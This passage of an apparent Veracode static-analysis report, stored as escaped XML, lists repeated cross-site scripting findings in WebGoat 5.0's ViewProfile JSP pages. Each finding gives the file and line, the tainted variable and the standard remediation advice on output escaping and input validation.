        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"189\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"69\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"35\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"179\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"70\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"39\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"32\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getCcn().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"70\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"39\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"145\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable webSession.htmlEncode().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"73\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"40\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"76\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPersonalDescription().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"74\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"43\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"119\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getPersonalDescription().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"74\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"43\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"98\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"76\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"45\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"127\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"77\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"44\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"100\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"78\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/RoleBasedAccessControl/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.RoleBasedAccessControl.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"48\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"50\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionNotes().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparameter,
        java.sql.statement.executequery, java.sql.preparedstatement.executequery,
        and javax.servlet.servletrequest.getparametervalues. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"78\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/SQLInjection/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.SQLInjection.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"48\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"264\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
        body of an HTML page, use HTML entity encoding (e.g. StringEscapeUtils.escapeHtml()
        in J2EE or HttpUtility.HtmlEncode() in ASP.NET). For more details on contextual
        escaping, see https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet.
        In addition, as a best practice, always validate user-supplied input to ensure
        that it conforms to the expected format, using centralized data validation
        routines when possible.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/79.html)
        \r\nOWASP (http://www.owasp.org/index.php/XSS) \r\nWASC (http://webappsec.pbworks.com/Cross-Site-Scripting)\r\n\r\n\"
        note=\"\" cweid=\"80\" remediationeffort=\"3\" exploitLevel=\"2\" categoryid=\"20\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"ppn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"ViewProfile_jsp.java\" line=\"79\" sourcefilepath=\"com/veracode/compiledjsp/xWebGoat50war/lessons/CrossSiteScripting/\"
        scope=\"com.veracode.compiledjsp.xWebGoat50war.lessons.CrossSiteScripting.ViewProfile_jsp\"
        functionprototype=\"void _jspService(javax.servlet.http.HttpServletRequest,
        javax.servlet.http.HttpServletResponse)\" functionrelativelocation=\"46\">\n<exploitability_adjustments>\n<exploitability_adjustment
        score_adjustment=\"1\">\n<note>This source of the tainted data is an external
        web request.</note>\n</exploitability_adjustment>\n</exploitability_adjustments>\n</flaw>\n<flaw
        severity=\"3\" categoryname=\"Improper Neutralization of Script-Related HTML
        Tags in a Web Page (Basic XSS)\" count=\"1\" issueid=\"68\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.jsp.JspWriter.print\" description=\"This call to javax.servlet.jsp.JspWriter.print()
        contains a cross-site scripting (XSS) flaw. The application populates the
        HTTP response with user-supplied input, allowing an attacker to embed malicious
        content, such as Javascript code, which will be executed in the context of
        the victim's browser. XSS vulnerabilities are commonly exploited to steal
        or manipulate cookies, modify presentation of content, and compromise confidential
        information, with new attack vectors being discovered on a regular basis.
        The first argument to print() contains tainted data from the variable employee.getDisciplinaryActionDate().
        The tainted data originated from earlier calls to javax.servlet.servletrequest.getparametervalues,
        javax.servlet.servletrequest.getparameter, java.sql.statement.executequery,
        and java.sql.preparedstatement.executequery. The tainted data is directed
        into an output stream returned by javax.servlet.jsp.JspWriter.\r\n\r\nUse
        contextual escaping on all untrusted data before using it to construct any
        portion of an HTTP response. The escaping method should be chosen based on
        the specific use case of the untrusted data, otherwise it may not protect
        fully against the attack. For example, if the data is being written to the
